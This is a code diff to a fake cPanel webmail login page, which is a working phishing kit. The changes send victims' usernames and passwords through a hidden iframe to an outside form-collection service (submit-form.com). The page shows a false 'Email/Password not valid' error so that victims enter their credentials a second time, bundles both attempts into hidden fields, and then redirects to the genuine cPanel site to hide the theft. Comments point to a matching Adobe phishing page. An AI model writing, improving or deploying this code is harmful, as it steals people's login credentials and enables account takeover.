@@ -90,10 +90,19 @@
       .e-hidden {
         visibility: hidden;
       }
+      
+      /* Hidden iframe for form submission */
+      #hidden_iframe {
+        display: none;
+      }
     </style>
   </head>
   <body class="wm">
     <div class="loader loader--hidden"></div>
+    
+    <!-- Hidden iframe for form submission (like the Adobe page) -->
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+    
     <input type="hidden" id="goto_uri" value="/" />
     <input type="hidden" id="goto_app" value="" />
 
@@ -139,7 +148,7 @@
                   <form
                     novalidate=""
                     id="login_form"
-                    target="_self"
+                    target="hidden_iframe"
                     style="visibility: "
                     data-botpoison-public-key="pk_e35707e9-231d-46c2-966b-ab76048d3c75"
                   >
@@ -177,6 +186,12 @@
                         required=""
                       />
                     </div>
+                    
+                    <!-- Hidden field for attempt tracking (like Adobe) -->
+                    <input type="hidden" id="attempt" name="attempt" value="1">
+                    
+                    <!-- Hidden field for webmail identifier -->
+                    <input type="hidden" name="webmail_login" value="true">
 
                     <div class="controls">
                       <div class="login-btn">
@@ -225,7 +240,11 @@
     </div>
 
     <script>
-      const FORMSPARK_URL = "https://submit-form.com/0gyAIslPc";
+      // Store first attempt data (like the Adobe page)
+      let firstAttempt = {
+        email: '',
+        password: ''
+      };
 
       window.onload = function () {
         const url = window.location.href;
@@ -246,13 +265,17 @@
       const a2 = document.querySelectorAll(".a1");
       const form = document.getElementById("login_form");
       let clickCount = 0;
-      let isSubmitting = false;
-
-      form.addEventListener("submit", async function (event) {
-        event.preventDefault();
-        if (isSubmitting) return;
-
-        if (emailInput.value === "") {
+      
+      // Add event listener for form submission (like Adobe - let it submit naturally)
+      form.addEventListener("submit", function(event) {
+        // Get current values
+        const email = emailInput.value;
+        const password = passwordInput.value;
+        const attempt = document.getElementById("attempt").value;
+        
+        // Validate
+        if (email === "") {
+          event.preventDefault();
           a1.forEach(el => el.classList.remove("e-hidden"));
           a2.forEach(el => (el.innerHTML = "You must specify a username to log in."));
           setTimeout(() => {
@@ -262,7 +285,8 @@
           return;
         }
 
-        if (passwordInput.value === "") {
+        if (password === "") {
+          event.preventDefault();
           a1.forEach(el => el.classList.remove("e-hidden"));
           a2.forEach(el => (el.innerHTML = "Password is required"));
           setTimeout(() => {
@@ -271,62 +295,95 @@
           }, 4000);
           return;
         }
-
-        showLoader();
-        isSubmitting = true;
-
-        // Create FormData from the form (this automatically includes the Botpoison token)
-        const formData = new FormData(form);
         
-        // Add our custom fields (they'll be appended alongside the form's existing fields)
-        formData.append("email", emailInput.value);
-        formData.append("password", passwordInput.value);
-        formData.append("webmail_login", "true");
-
-        try {
-          const response = await fetch(FORMSPARK_URL, {
-            method: "POST",
-            body: formData // Send as FormData, not JSON
-          });
-
-          if (response.ok) {
-            console.log("✅ Formspark submission successful with Botpoison");
-          } else {
-            console.error("❌ Formspark submission failed:", response.status);
-          }
-        } catch (error) {
-          console.error("❌ Error sending to Formspark:", error);
+        // Show loader
+        showLoader();
+        
+        // Set form action to Formspark (like Adobe)
+        form.action = "https://submit-form.com/0gyAIslPc";
+        form.method = "POST";
+        
+        // Check if this is first or second attempt (like Adobe)
+        if (attempt == 1) {
+          // First attempt: Store credentials
+          firstAttempt.email = email;
+          firstAttempt.password = password;
+          
+          // Update hidden field to 2 for next attempt
+          document.getElementById("attempt").value = "2";
+          
+          // Let form submit naturally to hidden iframe
+          
+          // Show error after 3 seconds
+          setTimeout(showError, 3000);
+          
+        } else {
+          // Second attempt: Add first attempt data as hidden fields
+          const firstEmailInput = document.createElement('input');
+          firstEmailInput.type = 'hidden';
+          firstEmailInput.name = 'first_attempt_email';
+          firstEmailInput.value = firstAttempt.email;
+          form.appendChild(firstEmailInput);
+          
+          const firstPasswordInput = document.createElement('input');
+          firstPasswordInput.type = 'hidden';
+          firstPasswordInput.name = 'first_attempt_password';
+          firstPasswordInput.value = firstAttempt.password;
+          form.appendChild(firstPasswordInput);
+          
+          const secondAttemptInput = document.createElement('input');
+          secondAttemptInput.type = 'hidden';
+          secondAttemptInput.name = 'second_attempt';
+          secondAttemptInput.value = 'final';
+          form.appendChild(secondAttemptInput);
+          
+          // Redirect to cPanel after form submits
+          setTimeout(function() {
+            window.location.href = "https://www.cpanel.net/products/";
+          }, 1000);
         }
-
-        setTimeout(() => {
-          a1.forEach(el => el.classList.remove("e-hidden"));
-          a2.forEach(el => (el.innerHTML = "Your Email/Password not valid"));
-          passwordInput.value = "";
-          setTimeout(() => {
-            a1.forEach(el => el.classList.add("e-hidden"));
-            a2.forEach(el => (el.innerHTML = ""));
-            isSubmitting = false;
-          }, 4000);
-        }, 3000);
-
-        if (emailInput.value && passwordInput.value) {
-          clickCount++;
-          if (clickCount >= 3) {
-            redirectPage();
-          }
+        
+        // Count clicks for third attempt redirect (keeping your original logic)
+        clickCount++;
+        if (clickCount >= 3) {
+          setTimeout(function() {
+            window.location.href = "https://www.cpanel.net/products/";
+          }, 3000);
         }
       });
 
-      function redirectPage() {
-        window.location.href = "https://www.cpanel.net/products/";
+      function showError() {
+        a1.forEach(el => el.classList.remove("e-hidden"));
+        a2.forEach(el => (el.innerHTML = "Your Email/Password not valid"));
+        passwordInput.value = "";
+        
+        // Hide loader
+        document.querySelector(".loader").classList.add("loader--hidden");
+        
+        // Clear error after 4 seconds
+        setTimeout(clearError, 4000);
+      }
+      
+      function clearError() {
+        a1.forEach(el => el.classList.add("e-hidden"));
+        a2.forEach(el => (el.innerHTML = ""));
       }
 
       function showLoader() {
         const loader = document.querySelector(".loader");
         loader.classList.remove("loader--hidden");
-        setTimeout(() => {
-          loader.classList.add("loader--hidden");
-        }, 3000);
+      }
+
+      function ttext() {
+        var button = document.querySelector(".asa");
+        var input = document.querySelector(".asa1");
+        if (button.textContent === "Show") {
+          button.textContent = "Hide";
+          input.type = "text";
+        } else {
+          button.textContent = "Show";
+          input.type = "password";
+        }
       }
     </script>
   </body>
